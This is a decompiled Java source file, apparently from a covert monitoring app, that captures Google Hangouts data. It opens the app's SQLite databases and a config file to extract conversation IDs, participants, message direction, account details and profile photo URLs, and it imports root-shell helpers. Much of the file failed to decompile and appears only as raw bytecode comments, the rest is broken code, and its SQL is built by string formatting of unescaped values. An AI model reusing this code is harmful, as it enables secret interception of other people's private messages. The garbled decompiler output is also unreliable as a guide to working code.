package com.vvt.capture.hangouts;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  /* Error */
  private static long a(int paramInt, SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: aconst_null
    //   4: astore 4
    //   6: aload_1
    //   7: ifnull +238 -> 245
    //   10: iconst_m1
    //   11: istore 5
    //   13: iload_0
    //   14: iload 5
    //   16: if_icmpeq +229 -> 245
    //   19: ldc 19
    //   21: astore 6
    //   23: ldc 21
    //   25: astore 7
    //   27: aconst_null
    //   28: astore 8
    //   30: iconst_0
    //   31: istore 9
    //   33: ldc 19
    //   35: astore 10
    //   37: iload_0
    //   38: invokestatic 27	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   41: astore 11
    //   43: aload_1
    //   44: astore 6
    //   46: aload_1
    //   47: aload 7
    //   49: aconst_null
    //   50: aconst_null
    //   51: aconst_null
    //   52: aconst_null
    //   53: aconst_null
    //   54: aload 10
    //   56: aload 11
    //   58: invokevirtual 33	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   61: astore 6
    //   63: aload 6
    //   65: ifnull +170 -> 235
    //   68: aload 6
    //   70: invokeinterface 39 1 0
    //   75: istore 12
    //   77: iload 12
    //   79: ifeq +62 -> 141
    //   82: ldc 41
    //   84: astore 7
    //   86: aload 6
    //   88: aload 7
    //   90: invokeinterface 45 2 0
    //   95: istore 12
    //   97: aload 6
    //   99: iload 12
    //   101: invokeinterface 49 2 0
    //   106: lstore 13
    //   108: lload 13
    //   110: lstore 15
    //   112: aload 6
    //   114: astore 8
    //   116: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   119: istore 9
    //   121: iload 9
    //   123: ifeq +3 -> 126
    //   126: aload 8
    //   128: ifnull +10 -> 138
    //   131: aload 8
    //   133: invokeinterface 53 1 0
    //   138: lload 15
    //   140: lreturn
    //   141: lconst_0
    //   142: lstore 13
    //   144: lload 13
    //   146: lstore 15
    //   148: aload 6
    //   150: astore 8
    //   152: goto -36 -> 116
    //   155: astore 6
    //   157: aconst_null
    //   158: astore 8
    //   160: iconst_m1
    //   161: i2l
    //   162: lstore 15
    //   164: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   167: istore 9
    //   169: iload 9
    //   171: ifeq +3 -> 174
    //   174: aload 8
    //   176: ifnull -38 -> 138
    //   179: goto -48 -> 131
    //   182: astore 6
    //   184: aload 4
    //   186: ifnull +10 -> 196
    //   189: aload 4
    //   191: invokeinterface 53 1 0
    //   196: aload 6
    //   198: athrow
    //   199: astore 7
    //   201: aload 6
    //   203: astore 4
    //   205: aload 7
    //   207: astore 6
    //   209: goto -25 -> 184
    //   212: astore 6
    //   214: aload 8
    //   216: astore 4
    //   218: goto -34 -> 184
    //   221: astore 7
    //   223: aload 6
    //   225: astore 8
    //   227: goto -67 -> 160
    //   230: astore 6
    //   232: goto -72 -> 160
    //   235: aload 6
    //   237: astore 8
    //   239: lload_2
    //   240: lstore 15
    //   242: goto -126 -> 116
    //   245: aconst_null
    //   246: astore 8
    //   248: lload_2
    //   249: lstore 15
    //   251: goto -135 -> 116
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	254	0	paramInt	int
    //   0	254	1	paramSQLiteDatabase	SQLiteDatabase
    //   2	247	2	l1	long
    //   4	213	4	localObject1	Object
    //   11	6	5	i	int
    //   21	128	6	localObject2	Object
    //   155	1	6	localException1	Exception
    //   182	20	6	localObject3	Object
    //   207	1	6	localObject4	Object
    //   212	12	6	localObject5	Object
    //   230	6	6	localException2	Exception
    //   25	64	7	str1	String
    //   199	7	7	localObject6	Object
    //   221	1	7	localException3	Exception
    //   28	219	8	localObject7	Object
    //   31	139	9	bool1	boolean
    //   35	20	10	str2	String
    //   41	16	11	str3	String
    //   75	3	12	bool2	boolean
    //   95	5	12	j	int
    //   106	39	13	l2	long
    //   110	140	15	l3	long
    // Exception table:
    //   from	to	target	type
    //   37	41	155	java/lang/Exception
    //   56	61	155	java/lang/Exception
    //   37	41	182	finally
    //   56	61	182	finally
    //   68	75	199	finally
    //   88	95	199	finally
    //   99	106	199	finally
    //   116	119	212	finally
    //   164	167	212	finally
    //   68	75	221	java/lang/Exception
    //   88	95	221	java/lang/Exception
    //   99	106	221	java/lang/Exception
    //   116	119	230	java/lang/Exception
  }
  
  public static long a(int paramInt, String paramString)
  {
    long l = -1;
    boolean bool1 = false;
    localSQLiteDatabase = null;
    int i = 17;
    try
    {
      localSQLiteDatabase = com.vvt.p.c.a(i, paramString);
      if (localSQLiteDatabase != null) {
        l = a(paramInt, localSQLiteDatabase);
      }
      if (localSQLiteDatabase == null) {
        break label43;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label43:
        boolean bool2 = b;
        if ((bool2) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label86;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    bool1 = a;
    if (bool1) {}
    return l;
  }
  
  /* Error */
  private static long a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: ldc 21
    //   5: astore_3
    //   6: aconst_null
    //   7: astore 4
    //   9: iconst_0
    //   10: istore 5
    //   12: ldc 19
    //   14: astore 6
    //   16: ldc 67
    //   18: astore 7
    //   20: aload_0
    //   21: astore 8
    //   23: aload_0
    //   24: aload_3
    //   25: aconst_null
    //   26: aconst_null
    //   27: aconst_null
    //   28: aconst_null
    //   29: aconst_null
    //   30: aload 6
    //   32: aload 7
    //   34: invokevirtual 33	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   37: astore 4
    //   39: aload 4
    //   41: ifnull +155 -> 196
    //   44: aload 4
    //   46: invokeinterface 70 1 0
    //   51: istore 9
    //   53: iload 9
    //   55: ifeq +54 -> 109
    //   58: ldc 41
    //   60: astore 8
    //   62: aload 4
    //   64: aload 8
    //   66: invokeinterface 45 2 0
    //   71: istore 9
    //   73: aload 4
    //   75: iload 9
    //   77: invokeinterface 49 2 0
    //   82: lstore 10
    //   84: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   87: istore 5
    //   89: iload 5
    //   91: ifeq +3 -> 94
    //   94: aload 4
    //   96: ifnull +10 -> 106
    //   99: aload 4
    //   101: invokeinterface 53 1 0
    //   106: lload 10
    //   108: lreturn
    //   109: lconst_0
    //   110: lstore 10
    //   112: goto -28 -> 84
    //   115: astore 8
    //   117: iconst_0
    //   118: istore 9
    //   120: aconst_null
    //   121: astore 8
    //   123: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   126: istore 12
    //   128: iload 12
    //   130: ifeq +3 -> 133
    //   133: aload 8
    //   135: ifnull +10 -> 145
    //   138: aload 8
    //   140: invokeinterface 53 1 0
    //   145: lload_1
    //   146: lstore 10
    //   148: goto -42 -> 106
    //   151: astore 8
    //   153: aconst_null
    //   154: astore 4
    //   156: aload 4
    //   158: ifnull +10 -> 168
    //   161: aload 4
    //   163: invokeinterface 53 1 0
    //   168: aload 8
    //   170: athrow
    //   171: astore 8
    //   173: goto -17 -> 156
    //   176: astore_3
    //   177: aload 8
    //   179: astore 4
    //   181: aload_3
    //   182: astore 8
    //   184: goto -28 -> 156
    //   187: astore 8
    //   189: aload 4
    //   191: astore 8
    //   193: goto -70 -> 123
    //   196: lload_1
    //   197: lstore 10
    //   199: goto -115 -> 84
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	202	0	paramSQLiteDatabase	SQLiteDatabase
    //   2	195	1	l1	long
    //   5	20	3	str1	String
    //   176	6	3	localObject1	Object
    //   7	183	4	localObject2	Object
    //   10	80	5	bool1	boolean
    //   14	17	6	str2	String
    //   18	15	7	str3	String
    //   21	44	8	localObject3	Object
    //   115	1	8	localException1	Exception
    //   121	18	8	localObject4	Object
    //   151	18	8	localObject5	Object
    //   171	7	8	localObject6	Object
    //   182	1	8	localObject7	Object
    //   187	1	8	localException2	Exception
    //   191	1	8	localObject8	Object
    //   51	3	9	bool2	boolean
    //   71	48	9	i	int
    //   82	116	10	l2	long
    //   126	3	12	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   32	37	115	java/lang/Exception
    //   32	37	151	finally
    //   44	51	171	finally
    //   64	71	171	finally
    //   75	82	171	finally
    //   84	87	171	finally
    //   123	126	176	finally
    //   44	51	187	java/lang/Exception
    //   64	71	187	java/lang/Exception
    //   75	82	187	java/lang/Exception
    //   84	87	187	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    long l = -1;
    boolean bool1 = false;
    localSQLiteDatabase = null;
    int i = 17;
    try
    {
      localSQLiteDatabase = com.vvt.p.c.a(i, paramString);
      if (localSQLiteDatabase != null) {
        l = a(localSQLiteDatabase);
      }
      if (localSQLiteDatabase == null) {
        break label41;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label41:
        boolean bool2 = b;
        if ((bool2) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label82;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    bool1 = a;
    if (bool1) {}
    return l;
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  private static HangoutsData.Direction a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    int i = 2;
    if (paramInt == i) {}
    for (HangoutsData.Direction localDirection = HangoutsData.Direction.IN;; localDirection = HangoutsData.Direction.OUT)
    {
      boolean bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return localDirection;
    }
  }
  
  private static com.vvt.im.events.info.b a(String paramString, List paramList, com.vvt.im.events.info.d paramd, SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = c(paramSQLiteDatabase, paramString);
    int k = com.vvt.ag.b.a((String)localObject1);
    if (k != 0)
    {
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      k = 0;
      localb = null;
      int i = paramList.size();
      if (k < i)
      {
        localObject1 = ((com.vvt.im.events.info.e)paramList.get(k)).d();
        String str = paramd.b();
        boolean bool2 = ((String)localObject1).equalsIgnoreCase(str);
        int j;
        if (!bool2)
        {
          j = paramList.size() + -1;
          if (k != j) {
            break label150;
          }
          localObject1 = ((com.vvt.im.events.info.e)paramList.get(k)).c();
          ((StringBuilder)localObject2).append((String)localObject1);
        }
        for (;;)
        {
          j = k + 1;
          k = j;
          break;
          label150:
          localObject1 = ((com.vvt.im.events.info.e)paramList.get(k)).c();
          localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
          str = ",";
          ((StringBuilder)localObject1).append(str);
        }
      }
      localObject1 = ((StringBuilder)localObject2).toString();
    }
    boolean bool4 = a;
    if (bool4) {}
    com.vvt.im.events.info.b localb = new com/vvt/im/events/info/b;
    localb.<init>();
    Object localObject2 = String.valueOf(paramString);
    localb.a((String)localObject2);
    localb.b((String)localObject1);
    localb.c(null);
    localObject1 = new byte[0];
    localb.a((byte[])localObject1);
    localb.d(null);
    boolean bool3 = a;
    if (bool3) {}
    return localb;
  }
  
  /* Error */
  public static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   11: istore_3
    //   12: iload_3
    //   13: ifeq +3 -> 16
    //   16: new 121	com/vvt/im/events/info/d
    //   19: astore 4
    //   21: aload 4
    //   23: invokespecial 158	com/vvt/im/events/info/d:<init>	()V
    //   26: iconst_0
    //   27: istore 5
    //   29: aconst_null
    //   30: astore 6
    //   32: ldc -96
    //   34: astore 7
    //   36: iconst_0
    //   37: istore 8
    //   39: ldc -96
    //   41: astore 9
    //   43: ldc -96
    //   45: astore 10
    //   47: iconst_0
    //   48: istore 11
    //   50: aconst_null
    //   51: astore 12
    //   53: iconst_0
    //   54: istore_3
    //   55: aconst_null
    //   56: astore 13
    //   58: new 162	java/io/FileReader
    //   61: astore 14
    //   63: aload 14
    //   65: aload_2
    //   66: invokespecial 164	java/io/FileReader:<init>	(Ljava/lang/String;)V
    //   69: new 166	java/io/BufferedReader
    //   72: astore 15
    //   74: sipush 256
    //   77: istore 11
    //   79: aload 15
    //   81: aload 14
    //   83: iload 11
    //   85: invokespecial 170	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   88: aload 9
    //   90: astore 13
    //   92: aload 7
    //   94: astore 12
    //   96: aconst_null
    //   97: astore 9
    //   99: aload 15
    //   101: invokevirtual 173	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   104: astore 7
    //   106: aload 7
    //   108: ifnull +218 -> 326
    //   111: ldc -81
    //   113: astore 6
    //   115: aload 7
    //   117: aload 6
    //   119: invokevirtual 178	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   122: istore 5
    //   124: ldc -76
    //   126: astore 16
    //   128: aload 7
    //   130: aload 16
    //   132: invokevirtual 178	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   135: istore 17
    //   137: ldc -74
    //   139: astore 18
    //   141: aload 7
    //   143: aload 18
    //   145: invokevirtual 178	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   148: istore 19
    //   150: ldc -72
    //   152: astore 20
    //   154: aload 7
    //   156: aload 20
    //   158: invokevirtual 178	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   161: istore 21
    //   163: ldc -70
    //   165: astore 22
    //   167: aload 7
    //   169: aload 22
    //   171: invokevirtual 178	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   174: istore 23
    //   176: iconst_m1
    //   177: istore 24
    //   179: iload 5
    //   181: iload 24
    //   183: if_icmple +31 -> 214
    //   186: iload 5
    //   188: bipush 10
    //   190: iadd
    //   191: istore 5
    //   193: aload 7
    //   195: iload 5
    //   197: iload 23
    //   199: invokevirtual 190	java/lang/String:substring	(II)Ljava/lang/String;
    //   202: astore 12
    //   204: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   207: istore 5
    //   209: iload 5
    //   211: ifeq +3 -> 214
    //   214: iconst_m1
    //   215: istore 5
    //   217: iload 17
    //   219: iload 5
    //   221: if_icmple +218 -> 439
    //   224: iload 17
    //   226: bipush 13
    //   228: iadd
    //   229: istore 5
    //   231: aload 7
    //   233: iload 5
    //   235: iload 23
    //   237: invokevirtual 190	java/lang/String:substring	(II)Ljava/lang/String;
    //   240: astore 13
    //   242: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   245: istore 5
    //   247: iload 5
    //   249: ifeq +3 -> 252
    //   252: iconst_m1
    //   253: istore 5
    //   255: iload 21
    //   257: iload 5
    //   259: if_icmple +31 -> 290
    //   262: iload 21
    //   264: bipush 15
    //   266: iadd
    //   267: istore 5
    //   269: aload 7
    //   271: iload 5
    //   273: iload 23
    //   275: invokevirtual 190	java/lang/String:substring	(II)Ljava/lang/String;
    //   278: astore 9
    //   280: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   283: istore 25
    //   285: iload 25
    //   287: ifeq +3 -> 290
    //   290: aload 12
    //   292: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   295: istore 25
    //   297: iload 25
    //   299: ifne -200 -> 99
    //   302: aload 13
    //   304: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   307: istore 25
    //   309: iload 25
    //   311: ifne -212 -> 99
    //   314: aload 9
    //   316: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   319: istore 25
    //   321: iload 25
    //   323: ifne -224 -> 99
    //   326: aload 14
    //   328: invokestatic 195	com/vvt/io/d:a	(Ljava/io/FileReader;)V
    //   331: aload 15
    //   333: invokestatic 198	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   336: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   339: istore 26
    //   341: iload 26
    //   343: ifeq +3 -> 346
    //   346: aload 13
    //   348: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   351: istore 26
    //   353: iload 26
    //   355: ifne +193 -> 548
    //   358: aload 13
    //   360: invokestatic 201	com/vvt/capture/hangouts/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   363: astore 13
    //   365: aload 12
    //   367: aload 13
    //   369: aload_1
    //   370: invokestatic 204	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   373: astore 13
    //   375: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   378: istore 8
    //   380: iload 8
    //   382: ifeq +3 -> 385
    //   385: aload 4
    //   387: aconst_null
    //   388: invokevirtual 205	com/vvt/im/events/info/d:d	(Ljava/lang/String;)V
    //   391: aload 4
    //   393: aload 9
    //   395: invokevirtual 206	com/vvt/im/events/info/d:a	(Ljava/lang/String;)V
    //   398: aload 4
    //   400: aload 12
    //   402: invokevirtual 207	com/vvt/im/events/info/d:removeFromPath	(Ljava/lang/String;)V
    //   405: aload 4
    //   407: aload 10
    //   409: invokevirtual 208	com/vvt/im/events/info/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   412: aload 4
    //   414: aload 13
    //   416: invokevirtual 211	com/vvt/im/events/info/d:f	(Ljava/lang/String;)V
    //   419: aconst_null
    //   420: astore 13
    //   422: aload 4
    //   424: aconst_null
    //   425: invokevirtual 212	com/vvt/im/events/info/d:a	([B)V
    //   428: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   431: istore_3
    //   432: iload_3
    //   433: ifeq +3 -> 436
    //   436: aload 4
    //   438: areturn
    //   439: iconst_m1
    //   440: istore 5
    //   442: iload 19
    //   444: iload 5
    //   446: if_icmple -194 -> 252
    //   449: iload 19
    //   451: bipush 20
    //   453: iadd
    //   454: istore 5
    //   456: aload 7
    //   458: iload 5
    //   460: iload 23
    //   462: invokevirtual 190	java/lang/String:substring	(II)Ljava/lang/String;
    //   465: astore 13
    //   467: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   470: istore 5
    //   472: iload 5
    //   474: ifeq -222 -> 252
    //   477: goto -225 -> 252
    //   480: astore 15
    //   482: iconst_0
    //   483: istore 26
    //   485: aconst_null
    //   486: astore 15
    //   488: aconst_null
    //   489: astore 14
    //   491: aload 9
    //   493: astore 13
    //   495: aload 7
    //   497: astore 12
    //   499: aconst_null
    //   500: astore 9
    //   502: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   505: istore 25
    //   507: iload 25
    //   509: ifeq +3 -> 512
    //   512: aload 14
    //   514: invokestatic 195	com/vvt/io/d:a	(Ljava/io/FileReader;)V
    //   517: goto -186 -> 331
    //   520: astore 9
    //   522: iconst_0
    //   523: istore 26
    //   525: aconst_null
    //   526: astore 15
    //   528: aconst_null
    //   529: astore 14
    //   531: aload 9
    //   533: astore 13
    //   535: aload 14
    //   537: invokestatic 195	com/vvt/io/d:a	(Ljava/io/FileReader;)V
    //   540: aload 15
    //   542: invokestatic 198	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   545: aload 13
    //   547: athrow
    //   548: aload_0
    //   549: aload 12
    //   551: invokestatic 214	com/vvt/capture/hangouts/d:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   554: astore 13
    //   556: aload 13
    //   558: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   561: istore 26
    //   563: iload 26
    //   565: ifne +70 -> 635
    //   568: aload 13
    //   570: invokestatic 201	com/vvt/capture/hangouts/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   573: astore 13
    //   575: aload 12
    //   577: aload 13
    //   579: aload_1
    //   580: invokestatic 204	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   583: astore 13
    //   585: goto -210 -> 375
    //   588: astore 12
    //   590: iconst_0
    //   591: istore 26
    //   593: aconst_null
    //   594: astore 15
    //   596: aload 12
    //   598: astore 13
    //   600: goto -65 -> 535
    //   603: astore 13
    //   605: goto -70 -> 535
    //   608: astore 12
    //   610: iconst_0
    //   611: istore 26
    //   613: aconst_null
    //   614: astore 15
    //   616: aload 7
    //   618: astore 12
    //   620: aload 9
    //   622: astore 13
    //   624: aconst_null
    //   625: astore 9
    //   627: goto -125 -> 502
    //   630: astore 7
    //   632: goto -130 -> 502
    //   635: iconst_0
    //   636: istore_3
    //   637: aconst_null
    //   638: astore 13
    //   640: goto -265 -> 375
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	643	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	643	1	paramString1	String
    //   0	643	2	paramString2	String
    //   3	634	3	bool1	boolean
    //   19	418	4	locald	com.vvt.im.events.info.d
    //   27	169	5	i	int
    //   207	3	5	bool2	boolean
    //   215	19	5	j	int
    //   245	3	5	bool3	boolean
    //   253	206	5	k	int
    //   470	3	5	bool4	boolean
    //   30	88	6	str1	String
    //   34	583	7	str2	String
    //   630	1	7	localException1	Exception
    //   37	344	8	bool5	boolean
    //   41	460	9	str3	String
    //   520	101	9	localObject1	Object
    //   625	1	9	localObject2	Object
    //   45	363	10	str4	String
    //   48	36	11	m	int
    //   51	525	12	str5	String
    //   588	9	12	localObject3	Object
    //   608	1	12	localException2	Exception
    //   618	1	12	str6	String
    //   56	543	13	localObject4	Object
    //   603	1	13	localObject5	Object
    //   622	17	13	localObject6	Object
    //   61	475	14	localFileReader	java.io.FileReader
    //   72	260	15	localBufferedReader1	java.io.BufferedReader
    //   480	1	15	localException3	Exception
    //   486	129	15	localBufferedReader2	java.io.BufferedReader
    //   126	5	16	str7	String
    //   135	94	17	n	int
    //   139	5	18	str8	String
    //   148	306	19	i1	int
    //   152	5	20	str9	String
    //   161	106	21	i2	int
    //   165	5	22	str10	String
    //   174	287	23	i3	int
    //   177	7	24	i4	int
    //   283	225	25	bool6	boolean
    //   339	273	26	bool7	boolean
    // Exception table:
    //   from	to	target	type
    //   58	61	480	java/lang/Exception
    //   65	69	480	java/lang/Exception
    //   58	61	520	finally
    //   65	69	520	finally
    //   69	72	588	finally
    //   83	88	588	finally
    //   99	104	603	finally
    //   117	122	603	finally
    //   130	135	603	finally
    //   143	148	603	finally
    //   156	161	603	finally
    //   169	174	603	finally
    //   197	202	603	finally
    //   204	207	603	finally
    //   235	240	603	finally
    //   242	245	603	finally
    //   273	278	603	finally
    //   280	283	603	finally
    //   290	295	603	finally
    //   302	307	603	finally
    //   314	319	603	finally
    //   460	465	603	finally
    //   467	470	603	finally
    //   502	505	603	finally
    //   69	72	608	java/lang/Exception
    //   83	88	608	java/lang/Exception
    //   99	104	630	java/lang/Exception
    //   117	122	630	java/lang/Exception
    //   130	135	630	java/lang/Exception
    //   143	148	630	java/lang/Exception
    //   156	161	630	java/lang/Exception
    //   169	174	630	java/lang/Exception
    //   197	202	630	java/lang/Exception
    //   204	207	630	java/lang/Exception
    //   235	240	630	java/lang/Exception
    //   242	245	630	java/lang/Exception
    //   273	278	630	java/lang/Exception
    //   280	283	630	java/lang/Exception
    //   290	295	630	java/lang/Exception
    //   302	307	630	java/lang/Exception
    //   314	319	630	java/lang/Exception
    //   460	465	630	java/lang/Exception
    //   467	470	630	java/lang/Exception
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = false;
    localCursor = null;
    boolean bool2 = a;
    if (bool2) {}
    String str1 = "";
    String str2 = "SELECT profile_photo_url FROM participants WHERE (chat_id = '%s')";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString;
      str2 = String.format(str2, arrayOfObject);
      i = 0;
      arrayOfObject = null;
      localCursor = paramSQLiteDatabase.rawQuery(str2, null);
      if (localCursor != null)
      {
        boolean bool3 = localCursor.moveToFirst();
        if (bool3)
        {
          str2 = "profile_photo_url";
          int j = localCursor.getColumnIndex(str2);
          str1 = localCursor.getString(j);
          bool4 = a;
          if (!bool4) {}
        }
      }
      if (localCursor == null) {
        break label121;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4 = b;
        if ((bool4) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label163;
      }
      localCursor.close();
    }
    localCursor.close();
    label121:
    bool1 = a;
    if (bool1) {}
    return str1;
  }
  
  /* Error */
  private static String a(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc -21
    //   4: astore_3
    //   5: iconst_4
    //   6: istore 4
    //   8: iload 4
    //   10: anewarray 4	java/lang/Object
    //   13: astore 5
    //   15: iconst_0
    //   16: istore 6
    //   18: ldc -18
    //   20: astore 7
    //   22: aload 5
    //   24: iconst_0
    //   25: aload 7
    //   27: aastore
    //   28: iconst_1
    //   29: istore 6
    //   31: ldc 21
    //   33: astore 7
    //   35: aload 5
    //   37: iload 6
    //   39: aload 7
    //   41: aastore
    //   42: iconst_2
    //   43: istore 6
    //   45: ldc 41
    //   47: astore 7
    //   49: aload 5
    //   51: iload 6
    //   53: aload 7
    //   55: aastore
    //   56: iconst_3
    //   57: istore 6
    //   59: aload 5
    //   61: iload 6
    //   63: aload_0
    //   64: aastore
    //   65: aload_3
    //   66: aload 5
    //   68: invokestatic 221	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   71: astore_3
    //   72: iconst_0
    //   73: istore 4
    //   75: aconst_null
    //   76: astore 5
    //   78: aload_1
    //   79: aload_3
    //   80: aconst_null
    //   81: invokevirtual 225	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   84: astore_3
    //   85: aload_3
    //   86: ifnull +49 -> 135
    //   89: aload_3
    //   90: invokeinterface 228 1 0
    //   95: istore 4
    //   97: iload 4
    //   99: ifeq +36 -> 135
    //   102: ldc -18
    //   104: astore 5
    //   106: aload_3
    //   107: aload 5
    //   109: invokeinterface 45 2 0
    //   114: istore 4
    //   116: aload_3
    //   117: iload 4
    //   119: invokeinterface 233 2 0
    //   124: astore_2
    //   125: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   128: istore 4
    //   130: iload 4
    //   132: ifeq +3 -> 135
    //   135: aload_3
    //   136: ifnull +9 -> 145
    //   139: aload_3
    //   140: invokeinterface 53 1 0
    //   145: aload_2
    //   146: areturn
    //   147: astore_3
    //   148: aconst_null
    //   149: astore_3
    //   150: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   153: istore 4
    //   155: iload 4
    //   157: ifeq +3 -> 160
    //   160: aload_3
    //   161: ifnull -16 -> 145
    //   164: goto -25 -> 139
    //   167: astore 8
    //   169: aconst_null
    //   170: astore_3
    //   171: aload 8
    //   173: astore_2
    //   174: aload_3
    //   175: ifnull +9 -> 184
    //   178: aload_3
    //   179: invokeinterface 53 1 0
    //   184: aload_2
    //   185: athrow
    //   186: astore_2
    //   187: goto -13 -> 174
    //   190: astore 5
    //   192: goto -42 -> 150
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	195	0	paramString	String
    //   0	195	1	paramSQLiteDatabase	SQLiteDatabase
    //   1	184	2	localObject1	Object
    //   186	1	2	localObject2	Object
    //   4	136	3	localObject3	Object
    //   147	1	3	localException1	Exception
    //   149	30	3	localObject4	Object
    //   6	68	4	i	int
    //   95	3	4	bool1	boolean
    //   114	4	4	j	int
    //   128	28	4	bool2	boolean
    //   13	95	5	localObject5	Object
    //   190	1	5	localException2	Exception
    //   16	46	6	k	int
    //   20	34	7	str	String
    //   167	5	8	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   8	13	147	java/lang/Exception
    //   25	28	147	java/lang/Exception
    //   39	42	147	java/lang/Exception
    //   53	56	147	java/lang/Exception
